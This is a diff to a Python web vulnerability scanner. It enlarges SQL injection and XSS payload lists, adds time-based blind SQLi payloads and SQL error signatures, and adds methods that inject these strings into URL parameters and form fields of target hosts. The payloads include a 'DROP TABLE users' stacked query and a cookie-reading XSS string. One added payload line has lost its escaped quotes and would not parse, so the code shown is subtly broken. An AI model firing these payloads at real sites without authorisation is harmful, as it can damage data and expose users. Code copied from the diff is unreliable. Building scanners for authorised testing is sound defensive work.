@@ -30,17 +30,46 @@ requests.packages.urllib3.disable_warnings()
 # ── PAYLOAD LIBRARIES ────────────────────────────────────
 
 SQLI_PAYLOADS = [
-    "'", "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
-    "\" OR \"1\"=\"1", "1; DROP TABLE users--",
-    "1' AND 1=1--", "' UNION SELECT NULL--"
+    # Classic error-based
+    "'", "''", "';--", "' OR '1'='1", "' OR '1'='1'--",
+    "' OR 1=1--", "' OR 1=1#", "" OR "1"="1",
+    "1; DROP TABLE users--", "1' AND 1=1--",
+    # Union-based
+    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    # Blind boolean-based
+    "' AND 1=1--", "' AND 1=2--",
+    "' AND SLEEP(2)--", "1; WAITFOR DELAY '0:0:2'--",
+    # Stacked queries
+    "'; SELECT * FROM users--",
+]
+
+# Time-based blind SQLi payloads (separate for timing detection)
+SQLI_TIME_PAYLOADS = [
+    "' AND SLEEP(3)--",
+    "1; WAITFOR DELAY '0:0:3'--",
+    "' OR SLEEP(3)--",
 ]
 
 XSS_PAYLOADS = [
+    # Basic script injection
     "<script>alert('XSS')</script>",
+    "<script>alert(1)</script>",
+    # Event handlers
     "<img src=x onerror=alert('XSS')>",
-    "'\"><script>alert(1)</script>",
     "<svg onload=alert(1)>",
-    "javascript:alert(1)"
+    "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    # Attribute injection
+    "'\"><script>alert(1)</script>",
+    "\"\"><img src=x onerror=alert(1)>",
+    # JavaScript protocol
+    "javascript:alert(1)",
+    "javascript:alert(document.cookie)",
+    # Filter bypass
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<%2fscript>",
+    "<svg/onload=alert(1)>",
 ]
 
 TRAVERSAL_PAYLOADS = [
@@ -61,7 +90,14 @@ SENSITIVE_PATHS = [
 SQLI_ERRORS = [
     "sql syntax", "mysql_fetch", "ora-01756", "sqlite_",
     "sqlstate", "syntax error", "unclosed quotation",
-    "pg_query", "warning: mysql"
+    "pg_query", "warning: mysql", "you have an error in your sql",
+    "supplied argument is not a valid mysql", "invalid query",
+    "mysql_num_rows", "mysql_fetch_array", "pg_exec",
+    "supplied argument is not", "column count doesn",
+    "error in your sql syntax", "unexpected end of sql",
+    "division by zero", "invalid column name",
+    "microsoft ole db provider", "odbc sql server driver",
+    "ora-", "pls-", "db2 sql error", "quoted string not properly"
 ]
 
 
@@ -102,7 +138,9 @@ class WebTester:
 
             # Run all test suites
             self._test_sqli(ip, pages, forms)
+            self._test_sqli_blind(ip, pages, forms)
             self._test_xss(ip, pages, forms)
+            self._test_xss_forms(ip, forms)
             self._test_traversal(ip, pages)
             self._test_sensitive_files(ip, base_url)
             self._test_csrf(ip, forms)
@@ -247,6 +285,45 @@ class WebTester:
                     except requests.RequestException:
                         continue
 
+    # ── TIME-BASED BLIND SQLi ────────────────────────────
+
+    def _test_sqli_blind(self, ip: str, pages: list, forms: list):
+        """Test for time-based blind SQL injection."""
+        import time
+
+        for url in pages:
+            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            if not params:
+                continue
+
+            for param in params:
+                for payload in SQLI_TIME_PAYLOADS:
+                    test_params = {k: v[0] for k, v in params.items()}
+                    test_params[param] = payload
+                    new_query = urlencode(test_params)
+                    test_url = urlunparse(parsed._replace(query=new_query))
+
+                    try:
+                        start = time.time()
+                        r = self.session.get(test_url, timeout=10)
+                        elapsed = time.time() - start
+
+                        # If response took 3+ seconds, likely time-based SQLi
+                        if elapsed >= 3:
+                            self._add_finding(
+                                host_ip=ip, url=test_url,
+                                vuln_type="Blind SQL Injection (Time-Based)",
+                                severity="Critical",
+                                description=f"Time-based blind SQLi in '{param}'. Response delayed {elapsed:.1f}s with payload: {payload}",
+                                evidence=f"Response time: {elapsed:.2f}s (normal < 1s)",
+                                recommendation="Use parameterized queries. Never concatenate user input into SQL statements."
+                            )
+                            break
+                    except requests.RequestException:
+                        continue
+
     # ── CROSS-SITE SCRIPTING ──────────────────────────────
 
     def _test_xss(self, ip: str, pages: list, forms: list):
@@ -275,6 +352,38 @@ class WebTester:
                                 description=f"Reflected XSS in parameter '{param}'.",
                                 evidence=f"Payload reflected: {payload}",
                                 recommendation="Encode all output. Use Content-Security-Policy headers."
+                            )
+                            break
+                    except requests.RequestException:
+                        continue
+
+    # ── XSS IN FORM FIELDS ───────────────────────────────
+
+    def _test_xss_forms(self, ip: str, forms: list):
+        """Test XSS specifically in form fields via POST."""
+        for form in forms:
+            for input_field in form["inputs"]:
+                if input_field["type"] in ("submit", "hidden", "button", "file"):
+                    continue
+                for payload in XSS_PAYLOADS[:5]:
+                    data = {i["name"]: "test" for i in form["inputs"]}
+                    data[input_field["name"]] = payload
+                    try:
+                        if form["method"] == "post":
+                            r = self.session.post(form["action"], data=data,
+                                                  timeout=self.timeout)
+                        else:
+                            r = self.session.get(form["action"], params=data,
+                                                 timeout=self.timeout)
+
+                        if payload in r.text:
+                            self._add_finding(
+                                host_ip=ip, url=form["action"],
+                                vuln_type="Cross-Site Scripting (XSS) — Form Field",
+                                severity="High",
+                                description=f"Reflected XSS in form field '{input_field['name']}'. Payload reflected in response.",
+                                evidence=f"Payload: {payload}",
+                                recommendation="Encode all output. Validate and sanitize inputs. Use Content-Security-Policy."
                             )
                             break
                     except requests.RequestException:
